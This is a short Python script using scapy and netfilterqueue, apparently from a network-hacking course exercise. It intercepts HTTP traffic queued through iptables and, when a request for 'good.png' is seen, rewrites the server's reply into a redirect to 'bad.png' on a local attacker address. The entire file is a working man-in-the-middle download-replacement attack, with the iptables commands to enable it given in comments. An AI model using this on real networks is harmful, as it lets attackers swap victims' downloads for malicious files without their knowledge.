#!/usr/bin/python

# iptables --flush

# iptables -I OUTPUT -j NFQUEUE --queue-num 0 && iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue
import scapy.all as scapy


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            if "good.png" in scapy_packet[scapy.Raw].load:
                print("[+] png Download Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            if(scapy_packet[scapy.TCP].seq in ack_list):
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")

                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.20/bad.png\n\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                scapy_packet.show()

                packet.set_payload(str(scapy_packet))

    packet.accept()


nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print
